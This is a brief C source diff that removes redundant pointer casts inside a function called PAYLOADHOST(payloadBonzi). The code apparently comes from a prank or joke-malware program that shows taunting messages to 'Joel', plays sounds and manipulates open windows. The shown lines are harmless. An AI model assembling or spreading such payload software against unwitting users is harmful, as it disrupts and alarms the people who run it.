@@ -369,14 +369,14 @@ PAYLOADHOST(payloadBonzi) {
 
 	Sleep(1000);
 
-	CreateThread(NULL, 0, &messageThread, (void*)L"Prepare to meet your biggest enemy again, Joel!", 0, NULL);
+	CreateThread(NULL, 0, &messageThread, L"Prepare to meet your biggest enemy again, Joel!", 0, NULL);
 
 	Sleep(2000);
 	playSound(L"dong", L"Data\\4.bin", FALSE);
 
 	EnumWindows(&CleanWindowsProc, NULL);
 	Sleep(2000);
-	CreateThread(NULL, 0, &messageThread, (void*)L"LET'S FIGHT!", 0, NULL);
+	CreateThread(NULL, 0, &messageThread, L"LET'S FIGHT!", 0, NULL);
 
 	Sleep(2000);
 	EnumWindows(&CleanWindowsProc, NULL);
